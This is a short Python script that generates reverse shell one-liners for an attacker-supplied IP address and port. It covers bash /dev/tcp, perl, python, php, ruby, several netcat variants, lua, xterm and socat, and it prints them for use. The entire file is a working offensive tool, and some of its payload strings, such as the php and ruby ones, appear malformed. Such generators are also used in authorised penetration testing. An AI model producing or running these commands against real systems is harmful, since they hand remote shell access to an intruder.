#!/usr/bin/env python

import argparse

def parse_options():
    
    parser = argparse.ArgumentParser(description='python revshellgen.py -i 127.0.0.1 -p 4444 -t bash')
    parser.add_argument("-i", "--ipaddr", type=str, help="IP address to connect back to", required=True)
    parser.add_argument("-p", "--port", type=int, help="Port to connect back to", required=True)
    parser.add_argument("-t", "--type", type=str, help="Type of reverse shell to generate", dest='shelltype')
    parser.add_argument("-l", "--list", action="store_true", help="List available shell types", dest='shelllist')
    args = parser.parse_args()
    return args

def main(args):
    ipaddr = args.ipaddr
    port = args.port

    shells = {
        'bash':'bash -i >& /dev/tcp/%s/%d 0>&1' % (ipaddr, port),
        'perl':'perl -e \'use Socket;$i="%s";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' % (ipaddr, port),
        'python':'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"' % (ipaddr, port),
        'php':'php -r \'$sock=fsockopen("%s",%d);exec("/bin/sh -i <&3 >&3 2>&3");' % (ipaddr, port),
        'ruby':'ruby -rsocket -e\'f=TCPSocket.open(\"%s\",%d).to_i;exec sprintf(\"/bin/sh -i <&3 >&3 2>&3\",f,f,f)' % (ipaddr, port),
        'nc':'nc -e /bin/sh %s %d' % (ipaddr, port),
        'nc1':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f' % (ipaddr, port),
        'nc2':'rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc %s %d 1>/tmp/l' % (ipaddr, port),
        'lua':'lua5.1 -e \'local host,port = \"%s\",%d local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host,port); while true do local cmd,status,partial = tcp:receive() local f = io.popen(cmd,'r') local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()' % (ipaddr, port),
        'xterm':'xterm -display %s:1 \n# Connect to your shell with:\n# Xnest :1 or xhost +targetip' % (ipaddr),
        'socat':'socat exec:\'bash -li\',pty,stderr,setid,sigint,sane tcp:%s:%d \n# Catch incoming shell with:\n# socat file:`tty`,raw,echo=0 tcp-listen:%d' % (ipaddr, port, port)
    }

    if args.shelllist:
        print("\nAvailable shell types:")
        print(shells.keys())

    print("Reverse shell command:\n")
    if args.shelltype and args.shelltype in shells:
        print(shells[args.shelltype])
    else:
        for t,shell in shells.items():
            print("{}\n".format(shell))
        
if __name__ == "__main__":

    args = parse_options()
    main(args)
